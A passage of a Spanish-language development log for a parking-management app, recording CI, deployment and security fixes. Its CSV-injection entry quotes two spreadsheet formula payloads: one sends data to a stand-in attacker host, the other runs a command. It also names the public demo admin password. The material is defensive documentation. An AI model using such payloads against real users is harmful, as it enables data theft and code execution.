- **Contexto**: el helper `_enforce_endpoint_rate_limit` (check + audit + 429) estaba **copiado** en cinco routers —`users`, `vehicles`, `cameras`, `parkings`, `tariffs`— y un sexto (`gestor_operadores`) lo tenía escrito en línea, con una forma distinta (sin audit). Seis copias del mismo código: arreglar una no arreglaba las otras cinco, y el `skip` del T-68 había que propagarlo a las seis.
- **El arreglo**: una única función `enforce_endpoint_rate_limit(request, db, scope=..., actor_id=..., skip=...)` en `app/services/endpoint_rate_limit.py`, con **fail-open** si Redis no está (como el rate-limit de login) y el audit `rate_limited_endpoint`. Los seis routers delegan.
- **La puerta**: `tools/verificar_rate_limit_unico.py` exige que (a) no haya llamadas directas a `endpoint_rate_limiter.check(` en los routers, (b) la función única exista y lea el flag, y (c) la **excepción** siga siendo cierta (`password_reset.py`, cuyos endpoints son públicos y no tienen actor). Con `--autoprueba` (7 casos de mentira) y paso en el CI.
- **Criterios de aceptación**:
  - [x] Medido: seis copias del mismo código (cinco helpers + uno en línea).
  - [x] Una sola implementación; los seis sitios delegan.
  - [x] La puerta detecta una copia reintroducida (probado con su autoprueba y con un caso escrito a mano).
  - [x] La excepción de `password_reset.py` está justificada y la puerta avisa si deja de aplicar.
  - [x] Los 32 tests de rate-limit pasan.
  - [x] `ruff` y `mypy` en verde.

### T-70 · P2 — la puerta del repo se caía en Windows al imprimir un resumen con acentos

- **Estado**: **completado** — salida en UTF-8 de punta a punta
- **Contexto**: `tools/verificar_repo.py` capturaba la salida de los subprocesos con `encoding="utf-8", errors="replace"`, es decir, **decodificaba a ciegas**. Si el subproceso escribía en **cp1252** (la consola de Windows), los bytes de los acentos (`0xF3`) no son UTF-8 válido: salían como `U+FFFD` y el `print` reventaba con `UnicodeEncodeError`. Es decir: **la puerta del repo se caía entera** en Windows en cuanto una comprobación devolvía un resumen con tildes.
- **Cómo se encontró**: al añadir la puerta del rate-limit (T-69), cuyo resumen dice "…tiene una sola **implementación**…": la puerta nueva tiró abajo `verificar_repo.py` entero.
- **El arreglo (4 cosas)**:
  1. los subprocesos escriben en UTF-8 (`PYTHONIOENCODING=utf-8` y `PYTHONUTF8=1` en su entorno);
  2. la salida se captura en **bytes** y se decodifica con UTF-8 y, si no es válido, con cp1252 (fallback): los dos casos salen bien;
  3. el `print` del resumen pasa por `_consola()`, que ya existía en el fichero pero **no se usaba** en esa línea;
  4. el propio script fuerza UTF-8 en su `stdout` (la receta del `AGENTS.md`).
- **Criterios de aceptación**:
  - [x] Medido: `verificar_repo.py` reventaba con `UnicodeEncodeError` al imprimir el resumen con "implementación".
  - [x] Los subprocesos escriben en UTF-8 (comprobado byte a byte: `C3 B3` en vez de `F3`).
  - [x] La salida se decodifica con fallback (UTF-8 y, si no, cp1252).
  - [x] El `print` pasa por `_consola()` y el script fuerza UTF-8 en su salida.
  - [x] La autoprueba de la puerta del repo gana un caso: "un resumen con acentes se lee y se imprime sin romperse".
  - [x] `verificar_repo.py` pasa entero (**21 comprobaciones**) en Windows.

### T-71 · P1 — el build de producción no era reproducible (`npm ci || npm install`)

- **Estado**: **completado** — `npm ci` a secas + puerta del lockfile
- **Contexto**: tanto el `frontend/Dockerfile.prod` como el job `frontend` del CI hacían **`npm ci || npm install`**. Ese "fallback" es una trampa:
  - si `npm ci` falla (lockfile desincronizado con el `package.json`), la imagen (o el artefacto del CI) se construye con las **últimas versiones del registro**, **sin lockfile**: el build deja de ser reproducible y **el fallo queda escondido**;
  - el comentario del workflow lo justificaba como "red de seguridad por si el lock file dejara de estar versionado algún día", o sea: una red que sacrifices la reproducibilidad a cambio de que nadie se entere.
- **Por qué era peor de lo que parece**: sin el `frontend/.dockerignore` (T-63), el `node_modules` del host entraba en la imagen y `npm ci` fallaba → **el fallback era el que se estaba usando** → la imagen de producción se llevaba tiempo construyendo **sin lockfile**.
- **El arreglo**:
  1. `npm ci` a secas en los dos sitios (que falle de forma ruidosa si el lockfile no cuadra);
  2. **`tools/verificar_lockfile.py`**: una puerta que compara las dependencias del `package.json` con las del `package-lock.json` (en `packages[""]`, que es lo que npm mantiene sincronizado) y avisa **antes** de instalar. Con `--autoprueba` (6 casos de mentira) y paso en el CI.
- **Criterios de aceptación**:
  - [x] Medido: `npm ci --dry-run` con el lockfile actual pasa (el lockfile está sincronizado).
  - [x] Sin el `.dockerignore` de T-63, el `npm ci` de la imagen fallaba y el fallback construía sin lockfile (verificado: la imagen con `npm ci` a secas se construye bien **con** el `.dockerignore`).
  - [x] La puerta detecta una dependencia nueva, una versión cambiada, una quitada y una devDependency nueva.
  - [x] La puerta está en `tools/autopruebas.py`, en el job `frontend` del CI y en `verificar_repo.py`.
  - [x] `actionlint` exit 0.

### T-72 · P2 — el comando del AGENTS.md para probar el frontend en un contenedor limpio no funcionaba en Windows

- **Estado**: **completado** — el comando lleva un volumen anónimo
- **Contexto**: el `AGENTS.md` documentaba `docker run --rm -v "D:\Parking\frontend:/app" -w /app node:20 sh -c "npm ci && npm run lint && npx vue-tsc --noEmit && npm run build"` para probar de verdad el job `frontend` en su entorno real (Node 20, el del CI).
- **Medido**: **no funcionaba**. Al montar `frontend/` se monta también el `node_modules` del host (que es de Windows) y `npm ci` intenta **borrarlo** antes de instalar: en Windows esos ficheros están bloqueados y el borrado falla con `npm error EIO: i/o error, unlink '/app/node_modules/@rollup/...'`. O sea: el comando documentado como forma de verificar el job del frontend **se caía siempre** en la máquina de QA.
- **El arreglo**: montar un **volumen anónimo** en `/app/node_modules` (`-v /app/node_modules`): npm trabaja en un `node_modules` limpio del contenedor y el del host no se toca. Verificado con el comando completo (`npm ci && lint && vue-tsc && build` → todo en verde).
- **Criterios de aceptación**:
  - [x] Medido: sin el volumen anónimo, `npm ci` falla con `EIO` al borrar el `node_modules` del host.
  - [x] Con el volumen anónimo, el comando completo pasa (`npm ci`, lint, type-check y build).
  - [x] El `AGENTS.md` dice por qué el volumen **no es opcional** en Windows.

### T-73 · P1 — el job `frontend` de la réplica local se caía siempre en Windows

- **Estado**: **completado** — la réplica local lo ejecuta en un contenedor `node:20`
- **Contexto**: la réplica local (`tools/ejecutar_ci_local.py`) ejecuta los pasos `run:` del workflow en el **host**. Para el job `frontend` eso significa `npm ci` en Windows, y `npm ci` **borra** `node_modules` antes de instalar: en Windows esos ficheros están bloqueados y el borrado falla con *"the file was already in use (by a text editor or antivirus)"*. O sea: **la réplica local del job `frontend` se caía siempre**, y como el CI remoto no puede correr (facturación), el job `frontend` no se había podido verificar de principio a fin en ningún sitio.
- **El arreglo**: en la réplica local, los comandos `npm`/`npx` del job `frontend` se ejecutan **dentro de un contenedor `node:20`** (la versión del CI), con el frontend montado y el `node_modules` en un volumen con nombre, compartido entre los pasos del job (para que el `npm ci` del primero sirva al build del último). El volumen se limpia al empezar el job, para no arrastrar el de una corrida anterior. Los pasos que no son de npm (la puerta del lockfile) siguen corriendo en el host, que es lo que corresponde.
- **Criterios de aceptación**:
  - [x] Medido: `npm ci` en el host falla con "the file was already in use" al borrar `node_modules`.
  - [x] Con el contenedor, el job `frontend` de la réplica local **pasa entero**: `npm ci` (a secas, sin el fallback), lint, type-check y build.
  - [x] El build sale en Node 20 (la versión del CI), no en el Node 24 del host: la réplica local pasa a ser más fiel al CI, no menos.
  - [x] La puerta del lockfile se ejecuta en el host (no es un comando de npm) y pasa.
  - [x] `actionlint` exit 0.

### T-74 · P0 (seguridad) — el compose que se copia a la sucursal arrancaba con el secreto JWT público

- **Estado**: **completado** — `docker-compose.prod.yml` + puerta, y probado arrancando de verdad
- **Contexto**: el ADR-0001 dice, sin rodeos, que *"este `docker-compose.yml` **es** el fichero que se copia a una sucursal (`rsync` + `docker compose up -d`)"*. Pero ese fichero es el de **desarrollo**:
  - `ENVIRONMENT: development` → la validación del secreto JWT **no se aplica** → el backend arranca con `change-me-in-production`, que está escrito en este **repositorio público**: cualquiera podría firmar un token de **administrador**;
  - el frontend es el **dev-server de Vite** (código fuente montado, HMR), no la imagen de producción con nginx;
  - `CORS_ORIGINS` apunta a `localhost`, así que la app servida desde la IP de la sucursal no cargaría.
- **El arreglo**: `docker-compose.prod.yml` (un *override* del de desarrollo) con `ENVIRONMENT: production`, el **secreto, la URL pública y los orígenes obligatorios** (si faltan, `docker compose` falla al arrancar diciendo qué falta) y el frontend con el `Dockerfile.prod`. Y el ADR-0001 actualizado: a la sucursal se copia con `-f docker-compose.yml -f docker-compose.prod.yml`.
- **Probado de verdad** (no "debería funcionar"): se paró el stack de QA y se arrancó con el compose de producción → backend **healthy** con `ENVIRONMENT=production`, frontend servido por **nginx** (`Server: nginx/1.27.5`), **login 200** por las dos vías (JSON y OAuth2) a través del proxy, y la puerta del servidor de producción **5/5**. Después se volvió al stack de QA.
- **La puerta**: `tools/verificar_compose_produccion.py` exige que el compose de producción exista, arranque en `production`, no tenga el secreto por defecto en ningún valor, tenga las tres variables obligatorias, use el `Dockerfile.prod` y que **todos** los valores de `environment` de los dos compose **se puedan cargar en `Settings`**. Con `--autoprueba` (9 casos de mentira) y paso en el CI.
- **Criterios de aceptación**:
  - [x] Medido: con el compose de la raíz el backend acepta el secreto JWT por defecto (público) y sirve el dev-server.
  - [x] `docker-compose.prod.yml` con `ENVIRONMENT: production`, las tres variables obligatorias y el frontend con el `Dockerfile.prod`.
  - [x] **Stack arrancado de verdad** en modo producción: backend healthy, frontend con nginx, login 200 por las dos vías, 5/5 requisitos del PWA.
  - [x] Sin las variables, `docker compose` falla con un mensaje que dice qué falta.
  - [x] La puerta lo vigila (9 casos de autoprueba) y está en la meta-puerta, en el CI y en `verificar_repo.py`.
  - [x] El ADR-0001 actualizado: el follow-up, la superficie de red y una tabla con los requisitos de despliegue.

### T-75 · P0 — `TRUSTED_PROXIES` con el formato documentado impedía arrancar el backend

- **Estado**: **completado** — las dos listas son strings con su property
- **Contexto**: `TRUSTED_PROXIES` y `HEARTBEAT_SKIP_URL_PREFIXES` estaban declarados como `list[str]`. `pydantic-settings` parsea los campos de tipo lista **antes** de los validadores y para eso solo entiende **JSON**: un valor de entorno como `"172.16.0.0/12,10.0.0.0/8"` —justo el que documentaba el propio comentario del ajuste— hace fallar el arranque con `SettingsError: error parsing value for field "trusted_proxies"`.
- **Por qué no se había visto**: el `docker-compose.yml` no definía esas variables (se usaba el default de la clase), así que solo aparecía al desplegar. Y al añadir `TRUSTED_PROXIES` al compose (T-64) el compose pasó a llevar el valor inválido: **el despliegue de producción no arrancaba**. Se vio al arrancar el stack en modo producción (T-74): el backend se caía y el frontend devolvía 502.
- **El arreglo**: los dos campos pasan a ser **string** (que es lo que el entorno puede dar) y la lista se expone en una property (`trusted_proxies_list`, `heartbeat_skip_url_prefixes_list`), **igual que ya se hace** con `cors_origins` y `incident_attachment_allowed_mime_types`. El validador "before" de T-64 se quita: no llegaba al entorno.
- **La puerta**: la del compose de producción (T-74) carga **todos** los valores de `environment` de los dos compose en `Settings`: eso habría cazado este defecto antes de que seiese en producción.
- **Criterios de aceptación**:
  - [x] Medido: el backend **no arrancaba** con `TRUSTED_PROXIES="a,b"` (`SettingsError`), y el compose lleva ese valor.
  - [x] Los dos campos son strings y las listas se sacan en properties (el patrón de `cors_origins`).
  - [x] `ip.py` y `tasks.py` usan las properties.
  - [x] Tests actualizados (config, IP, heartbeat y rate-limit).
  - [x] La puerta del compose carga los valores de los 12 servicios en `Settings` sin errores.
  - [x] `ruff` y `mypy` en verde.

### T-76 · P1 — el lock de Redis dejaba a la suite sin bases libres (y se negaba a arrancar)

- **Estado**: **completado** — el lock se suelta al salir y se pueden robar los locks de procesos muertos
- **Contexto**: el aislamiento de Redis por base (T-65) toma la base con un lock `SET NX` de una hora. Pero **el proceso no soltaba el lock al terminar**: la base quedaba reservada hasta que pasase la hora.
- **Medido** (2026-10-22): tras varias ejecuciones seguidas, las ocho bases (8-15) quedaron reservadas y la suite se negaba a arrancar con `RuntimeError: no hay ninguna base de Redis libre (8-15) para la suite: hay demasiadas ejecuciones en paralelo`. Es decir: el arreglo de T-65, con el tiempo, **dejaba el repo sin poder ejecutar la suite**.
- **El arreglo (tres cosas)**:
  1. al salir, el proceso **libera** su base (`atexit`);
  2. si el lock lo tiene un proceso que ya no existe, **se puede robar** (comprobando el PID; en Windows con la API de Windows, porque `os.kill(pid, 0)` **mata** el proceso);
  3. la caducidad del lock baja a 15 minutos (respaldo para un proceso que muera sin poder soltar).
- **Criterios de aceptación**:
  - [x] Medido: la suite se negaba a arrancar por falta de bases libres.
  - [x] Las dos suites del host en paralelo (SQLite y PostgreSQL) **pasan las dos** (606 y 615), sin romperse los tests de rate-limit.
  - [x] Un lock de un proceso muerto se puede robar (y el proceso vivo suelta el suyo al salir).
  - [x] `ruff` en verde.

### T-77 · P1 (seguridad) — los informes CSV no neutralizaban las fórmulas (CSV injection)

- **Estado**: **completado** — el escapado se aplica en el punto de salida
- **Contexto**: los informes CSV (`/admin/reports/{informe}.csv` y el histórico `/margins.csv`) se escribían con `csv.writer` **tal cual**, y meten **datos que pone un usuario**:
  - la **matrícula** de un vehículo: el alta manual **no valida el formato** (`VehicleCreate.plate` solo exige 4-16 caracteres; el filtro de `plates.py` solo se usa en el pipeline del OCR, T-52), así que un conductor puede guardar cualquier texto;
  - el **nombre de la sucursal**, que pone un admin.
- **El vector**: una celda que empieza por `=`, `+`, `-`, `@`, tab o CR la interpretan Excel y LibreOffice como una **fórmula**, y se ejecuta al abrir el fichero: `=HYPERLINK("http://atacante/?d="&A1,"clic")` filtra datos de la hoja y `=cmd|'/c calc'!A0` ejecuta un comando en Windows. Es el **CSV injection** clásico.
- **El arreglo**: `escapar_celda_csv` (el patrón de OWASP: anteponer un apóstrofo, que es lo que hacen las hojas de cálculo para marcar "esto es texto") aplicado en el **punto de salida**, o sea a **todas** las celdas de los cinco informes y del CSV histórico de márgenes. Así se protegen todos los campos, no solo la matrícula.
  - **Salvedad deliberada**: los **números no se escapan**. Un importe negativo (`-12.50`) empieza por `-` pero **no es una fórmula** (una hoja de cálculo lo lee como número): escaparlo ensuciaría todos los informes de márgenes con pérdidas (`'-12.50`).
- **Criterios de aceptación**:
  - [x] Medido: `VehicleCreate.plate` solo exige 4-16 caracteres y el filtro de `plates.py` no se usa en el alta manual.
  - [x] El escapado se aplica a todas las celdas (los 5 informes + el CSV histórico de márgenes).
  - [x] Los números no se escapan: un importe negativo sale `-12.50`.
  - [x] Test de integración: un vehículo con la matrícula `=1+1` → el CSV sale con el apóstrofo delante y **ninguna** celda empieza por `=`, `+` o `@`. La primera versión usaba una matrícula de 20 caracteres y **lo cazó el job `integration` (PostgreSQL)**: la columna `vehicles.plate` es `VARCHAR(16)` y en SQLite la longitud no se respeta (el test pasaba en SQLite y fallaba en PostgreSQL).
  - [x] Test unitario parametrizado de los prefijos de fórmula y de los valores normales.
  - [x] **Probado que el test detecta el defecto** reintroduciéndolo (sin el escapado, el test falla).
  - [x] `ruff` y `mypy` en verde.

### T-78 · P1 (continuidad de datos) — el backup no incluía los adjuntos de los incidentes

- **Estado**: **completado** — el backup los incluye, la restauración los recupera y el simulacro lo comprueba
- **Contexto**: `backup.sh` solo hacía `pg_dump`. Pero **las fotos de los incidentes no viven en la base de datos**: viven en un volumen (`INCIDENT_ATTACHMENTS_DIR`). O sea que un backup restaurado en otra máquina dejaba la base diciendo que las fotos existen y los ficheros **faltando**: las descargas dan 404.
- **Y el simulacro trimestral (T-12) no lo detectaba**: solo comparaba el **recuento de filas** de la base. Daba **verde con las fotos perdidas** — y T-12 es la condición previa para cualquier HA (ADR-0001: *"nada de HA sin backups probados"*).
- **El arreglo**:
  1. `backup.sh` empaqueta el directorio de adjuntos, lo **cifra con la misma passphrase**, lo sube al remoto y lo retira junto a su volcado (mismo STAMP);
  2. `restore.sh` lo restaura (y avisa si el backup no lo trae);
  3. `simulacro.sh` mete un **fichero de prueba** en el volumen, hace el backup, restaura y comprueba que el fichero **vuelve con su contenido** y que el recuento coincide;
  4. `tools/verificar_backup.py` monta el volumen de adjuntos en el contenedor del simulacro (`--volumes-from`).
- **Criterios de aceptación**:
  - [x] Medido: el simulacro (que es la puerta) pasaba sin comprobar los adjuntos.
  - [x] El simulacro comprueba los adjuntos: fichero de prueba + recuento (7 | 7 en la ejecución real).
  - [x] **Probado que el simulacro falla** si el backup deja de incluirlos **y** si el restore deja de restaurarlos (dos mutaciones, dos fallos).
  - [x] El backup de los adjuntos se verifica al crearlo (se descifra y se lista el tar, como el dump).
  - [x] Los scripts conservan el bit de ejecución `100755` (si no, el cron no haría backups).
  - [x] `simulacro.sh` pasa entero (volcado, cifrado, restauración, esquema y arranque de la app).

### T-79 · P1 (seguridad) — crear incidentes y subir adjuntos no tenían rate-limit por endpoint

- **Estado**: **completado** — los dos endpoints pasan por el limitador, con scope propio
- **Contexto**: los endpoints que **más recursos consumen** del backend no tenían rate-limit por endpoint:
  - `POST /incidents/parkings/{id}` → una fila en la base de datos (y el aviso a los admins);
  - `POST /incidents/{id}/attachments` → hasta 3 ficheros de 10 MB, y al generar la miniatura **se descomprimen enteros**: 150 MB de RAM por foto de 50 MP (`MAX_PIXELES = 50.000.000`).
  Los scopes que existían eran `users_*`, `vehicles_*`, `parkings_*`, `tariffs_*`, `cameras_*` y `geofences_*`. O sea que un **operador** autenticado (el rol con menos permisos) podía crear incidentes y subir fotos **sin límite de peticiones**: llenar el volumen de adjuntos, llenar la base de datos y provocar descompresiones de 150 MB una y otra vez.
- **El arreglo**: los dos endpoints pasan por `enforce_endpoint_rate_limit` (la función única de T-69) con sus scopes (`incidents_create` e `incident_attachments_upload`) y el límite general por defecto (30 por minuto y actor): de sobra para el flujo real (una entrada de coche = un incidente) y corta el abuso. El bucket es **por actor**, así que un operador no bloquea a otro de la misma sucursal.
- **Y la fixture de limpieza de Redis del `conftest.py`** borra también los buckets nuevos: si no, los tests se contaminarían entre sí (es el mismo problema que el T-65).
- **Criterios de aceptación**:
  - [x] Medido: los scopes del limitador no incluían incidentes ni adjuntos.
  - [x] Los dos endpoints pasan por la función única, con su scope.
  - [x] El límite es **por actor**: otro operador de la misma sucursal no topa (test).
  - [x] **Probado que el test detecta el defecto** reintroduciéndolo (sin limitador, el test falla).
  - [x] La fixture de limpieza borra los buckets nuevos.
  - [x] `ruff` y `mypy` en verde.

### T-80 · P2 (documentación con consecuencia de seguridad) — el README no decía cómo desplegar en una sucursal

- **Estado**: **completado** — el README tiene su sección de producción y el `.env.example` declara las variables nuevas
- **Contexto**: el T-74 arregló el compose de producción, pero la **documentación seguía diciendo solo `docker compose up -d --build`**: el stack de **desarrollo**, que acepta el secreto JWT por defecto (`change-me-in-production`, público en este repositorio) y sirve HTTP plano sin TLS. Es decir: quien montara una sucursal siguiendo el README desplegaba con un **secreto público**, sin saber que existía `docker-compose.prod.yml`.
- **Y el `.env.example`** (el fichero que se copia para configurar) no declaraba `FRONTEND_BASE_URL` ni `TRUSTED_PROXIES`: las variables que el código ya exigía eran invisibles para quien configuraba el entorno.
- **El arreglo**:
  1. el README tiene una sección **"Despliegue en una sucursal (producción)"** con el comando `-f docker-compose.yml -f docker-compose.prod.yml`, las tres variables obligatorias (con por qué), el aviso del **TLS** y el de `TRUSTED_PROXIES`;
  2. el arranque rápido avisa de que ese es el stack de **desarrollo**;
  3. el `.env.example` declara `FRONTEND_BASE_URL` y `TRUSTED_PROXIES`, con su comentario.
  4. **`tools/verificar_readme_despliegue.py`**: una puerta que exige que el README mencione el compose de producción y las tres variables (y que diga que el stack por defecto es de desarrollo) y que el `.env.example` declare las dos variables nuevas. Con `--autoprueba` (8 casos de mentira) y paso en el CI.
- **Criterios de aceptación**:
  - [x] Medido: el README no mencionaba `docker-compose.prod.yml` ni las variables obligatorias, y el `.env.example` no declaraba las dos nuevas (la puerta lo detectó: 6 problemas).
  - [x] El README tiene su sección de producción y el aviso de desarrollo.
  - [x] El `.env.example` declara `FRONTEND_BASE_URL` y `TRUSTED_PROXIES`.
  - [x] La puerta lo vigila (8 casos de autoprueba) y está en la meta-puerta, en el CI y en `verificar_repo.py`.
  - [x] Escaneo de texto sin problemas.

### T-81 · P0 (seguridad) — el `JWT_SECRET` que proponía el `.env.example` se aceptaba en producción

- **Estado**: **completado** — el filtro es por prefijo y el `.env.example` ya no propone un secreto
- **Contexto**: el T-74 cerró el P0 del compose de producción, pero quedaba **otra puerta al mismo desastre**: el `.env.example` (el fichero que el README dice copiar con `cp .env.example .env`) proponía `JWT_SECRET=change-me-in-production-32-bytes-min`, y la lista de secretos prohibidos comparaba de forma **exacta** (tenía `change-me-in-production`, no `change-me-in-production-32-bytes-min`).
- **Medido**: `Settings(ENVIRONMENT="production", JWT_SECRET="change-me-in-production-32-bytes-min", FRONTEND_BASE_URL="https://app.ejemplo.es")` → **ACEPTADO**. O sea: quien copiara el `.env.example` a `.env` y montara una sucursal (con las otras variables puestas, que el README ya exige desde el T-80) arrancaba con un **secreto público** → **tokens de administrador falsificables**. El P0 del T-74, por la puerta del `.env`.
- **El arreglo (dos cosas)**:
  1. el filtro pasa a ser por **prefijo** (`change-me`, `changeme`): cualquier variante ("…-32-bytes-min", "…-lo-que-sea") se rechaza, sin tocar los secretos de verdad;
  2. el `.env.example` **no propone** un secreto: lo deja vacío, con el comentario de que en producción es obligatorio (el compose pone su default **solo** para desarrollo).
- **Criterios de aceptación**:
  - [x] Medido: el secreto del `.env.example` se aceptaba en producción (con `FRONTEND_BASE_URL` puesto, que es lo que el README exige).
  - [x] **Probado en el contenedor real**: con `ENVIRONMENT=production` y ese secreto, el backend **se niega a arrancar** con el mensaje que dice qué exportar.
  - [x] El filtro es por prefijo: se rechazan `change-me`, `change-me-in-production`, `change-me-in-production-32-bytes-min`, `change-me-cualquier-cosa`, `changeme-esto-tampoco` y el vacío.
  - [x] Un secreto real **sí** sirve en producción (el filtro no es tan laxo que lo rompa).
  - [x] En `development` el valor de mentira sigue valiendo (el equipo de QA lo usa a propósito).
  - [x] El `.env.example` deja `JWT_SECRET=` vacío, y la puerta del README de despliegue lo vigila.
  - [x] `ruff` y `mypy` en verde.

### T-82 · P2 — el escáner de secretos marcaba como secreto una orden de shell

- **Estado**: **completado** — una orden que *genera* el valor no es una credencial filtrada
- **Contexto**: la línea del README que dice cómo generar el secreto de firma de una sucursal,
  `export JWT_SECRET="$(openssl rand -base64 48)"`, la marcaba como *"JWT con valor real"*: el patrón `JWT_SECRET\s*=\s*["']…["']` no distingue un **literal** de una **sustitución de shell** (una orden que genera el valor).
- **Por qué salió a la luz**: en el árbol versionado el README está exento (los `.md` lo están), pero el escáner también mira el **historial**, y ahí no hay ruta que eximir. O sea: la puerta de secretos del repo se ponía en rojo por una línea de documentación correcta.
- **El arreglo**: una regla específica — un valor entre comillas que empieza por `$(` o por un acento grave es una orden de shell, no un literal — con tres casos nuevos en la autoprueba del escáner (sustitución, acentos graves y otro nombre de variable).
- **Criterios de aceptación**:
  - [x] Medido: el escáner del historial marcaba la línea del README como "JWT con valor real" (y `verificar_repo.py` quedaba en rojo por eso).
  - [x] La regla no exonera nada que deba exonerarse: un secreto real no empieza por `$(` ni por un acento grave.
  - [x] Tres casos nuevos en la autoprueba del escáner (sustitución, acentos graves, otro nombre).
  - [x] El escáner del historial vuelve a dar **"no hay secretos"**.
  - [x] `verificar_repo.py` vuelve a estar entero en verde.

### T-83 · P1 (seguridad) — el seed de demo se podía ejecutar en producción y creaba un administrador con contraseña pública

- **Estado**: **completado** — el seed se niega a arrancar en `staging`/`production`
- **Contexto**: `app/scripts/seed.py` **no miraba el entorno**, y el README de la raíz dice, sin distinguir desarrollo de producción:
  ```bash
  docker compose exec backend python -m app.scripts.seed
  ```
  Ese seed crea `admin@solidapp.es` con la contraseña `admin12345` (y un gestor, un operador y un cliente), **escritas en el README y en este repositorio público**. O sea: ejecutarlo en una sucursal dejaba un **administrador accesible**, y el README es exactamente lo que lleva a hacerlo.
- **El arreglo** (mismo patrón que el secreto JWT y el compose de producción): el seed **se niega a arrancar** en `staging`/`production` y dice por qué, salvo que se pase `--allow-demo-users` explícitamente (para quien quiera datos de prueba en un staging a propósito). El README avisa de que el seed es solo de desarrollo.
- **Criterios de aceptación**:
  - [x] Medido: el seed no comprobaba el entorno (cualquiera podía crear el admin de demo en una sucursal).
  - [x] **Probado en el contenedor real**: con `ENVIRONMENT=production`, el seed sale con código 1 y el mensaje que dice qué exportar, **sin tocar la base de datos** (el guard va antes de abrir la sesión).
  - [x] En `development`/`test` el seed funciona igual que antes.
  - [x] Con `--allow-demo-users` se permite explícitamente (y el motivo lo dice).
  - [x] Tests de la función pura (5 casos), `ruff` y `mypy` en verde.

### T-84 · P1 (integridad del dinero) — la API de tarifas aceptaba valores que rompían el cálculo del importe

- **Estado**: **completado** — el esquema valida y el cálculo se protege
- **Contexto**: `TariffCreate`/`TariffUpdate` **no validaban ninguno** de los cuatro campos del importe: `price_per_hour`, `price_per_fraction`, `fraction_minutes` y `max_daily`.
- **Medido** (2026-10-22, contra la API real):
  - `fraction_minutes=0` → cerrar un ticket peta con **`ZeroDivisionError`** (un 500 y el ticket se queda abierto, con la plaza bloqueada);
  - `price_per_hour=-5` → el importe del ticket sale **-12,00 €** (se cobra de menos);
  - `max_daily=-1` → el tope diario deja el importe en negativo.
- **Y lo que lo hace serio**: la tarifa **queda en la base de datos** y `_find_tariff` toma la más reciente, así que afecta a **todos** los tickets de esa sucursal desde que entra en vigor. No era un fallo de un ticket: era un fallo permanente y silencioso.
- **El arreglo (dos cosas)**:
  1. el esquema valida: precios `>= 0`, `fraction_minutes > 0` y `max_daily > 0` (si se da);
  2. **defensa en profundidad** en el cálculo, para las tarifas que ya estuvieran en la base de datos: una fracción de 0 no divide por cero y **el importe nunca es negativo** (`max(0.0, amount)`).
- **Criterios de aceptación**:
  - [x] Medido: el esquema aceptaba los cuatro valores inválidos; `ZeroDivisionError` con `fraction_minutes=0`; importe **-12,00 €** con precio negativo.
  - [x] **Probado contra la API real**: los cuatro valores inválidos devuelven **422** con el mensaje de pydantic, y una tarifa válida pasa la validación.
  - [x] El cálculo no divide por cero y nunca devuelve un importe negativo (tests con tarifas rotas en memoria).
  - [x] El patch (`TariffUpdate`) también valida.
  - [x] 12 tests nuevos, `ruff` y `mypy` en verde.


### T-85 · P1 (seguridad) — la vía OAuth2 del login no comprobaba `is_active`

- **Estado**: **completado** — las dos vías de login usan la misma autenticación
- **Contexto**: `POST /auth/login` (JSON) y `POST /auth/login/oauth` (formulario OAuth2) **repetían cada una su propio bloque de código**, y se desincronizaron. La vía JSON comprobaba `user.is_active` y devolvía **403 «Usuario inactivo»**; la vía OAuth2 **no lo comprobaba**: una cuenta desactivada se logueaba por OAuth2, recibía **200 con tokens** y dejaba un `login_success` en la auditoría.
- **Por qué no era sólo cosmético**: el token no servía para nada (todo endpoint protegido vuelve a comprobar `is_active` en `core/deps.py`), pero la **auditoría mentía**: decía que un usuario desactivado había entrado. En una revisión forense, esa fila es la que dice quién entró.
- **El arreglo**: **una sola implementación** (`_autenticar` en `backend/app/api/v1/auth.py`), que las dos vías llaman. Es el mismo patrón que el rate-limit (T-59): lo que se repite, se unifica y una puerta vigila que no se duplique.
- **Criterios de aceptación**:
  - [x] Medido: la vía OAuth2 devolvía 200 con tokens para una cuenta desactivada y auditaba `login_success`; la vía JSON devolvía 403.
  - [x] Las dos vías rechazan ahora la cuenta desactivada con 403 y auditan `login_failure` con `reason=user_inactive`.
  - [x] La vía OAuth2 de una cuenta **activa** sigue funcionando (no se ha roto el botón «Authorize» de `/docs`).
  - [x] 13 tests nuevos en `backend/tests/test_login_hardening.py`; `ruff` y `mypy` en verde.

### T-86 · P2 (seguridad) — el tiempo de respuesta del login filtraba qué cuentas existen

- **Estado**: **completado** — el login verifica siempre (con un hash señuelo si no hay cuenta)
- **Contexto**: el login hacía `if not user or not verify_password(...)`: si el **email no existía**, el bcrypt **no se ejecutaba** y la respuesta era inmediata. El mensaje era el mismo en los dos casos (401 «Credenciales inválidas»), así que el único oráculo era el **tiempo**.
- **Medido** (2026-10-23, contra la API real en marcha, mediana de 6 peticiones):
  | caso | latencia |
  |---|---|
  | email inexistente | **13,9 ms** |
  | email real + contraseña incorrecta | **207,6 ms** |
  | diferencia | **×15** |
  Con eso se enumeran los correos registrados de una sucursal (administradores, gestores) sin fallar ni un solo intento.
- **El arreglo**: `verify_password_or_dummy()` verifica **siempre**: si no hay usuario, comprueba contra un **hash señuelo** de 12 rondas (el mismo coste que los de verdad) y descarta el resultado. El coste es el mismo en los dos casos, así que el tiempo deja de filtrar nada.
- **Criterios de aceptación**:
  - [x] Medido: 13,9 ms frente a 207,6 ms (×15) — el oráculo existía.
  - [x] El login con email inexistente **ejecuta el bcrypt** (comprobado con un espía en `_bcrypt_verify`).
  - [x] La diferencia entre los dos casos es **menor de 100 ms** (comparación de medianas de 3, con calentamiento: un suelo absoluto no discriminaba dentro del `TestClient`).
  - [x] El hash señuelo tiene las **mismas 12 rondas** que los hashes reales: si no, el tiempo seguiría filtrando.
  - [x] Prueba inversa: quitando el hash señuelo, los dos tests de latencia **fallan**.

### T-87 · P1 (seguridad) — bcrypt truncaba en silencio a 72 bytes

- **Estado**: **completado** — el límite real de 72 bytes está en un solo sitio y es un 422
- **Contexto**: **bcrypt sólo tiene en cuenta los primeros 72 bytes** y passlib **trunca en silencio**. Los esquemas de la API permitían contraseñas de hasta **128 caracteres**.
- **Medido** (2026-10-23, en el contenedor real):
  ```python
  >>> bcrypt.verify("a" * 100 + "b", bcrypt.hash("a" * 100))
  True
  ```
  O sea: **dos contraseñas distintas con los mismos 72 primeros bytes eran la misma contraseña** para el sistema. Tres consecuencias:
  1. El usuario fijaba una clave de 128 caracteres creyendo que el sufijo protegía algo: **no protegía nada**.
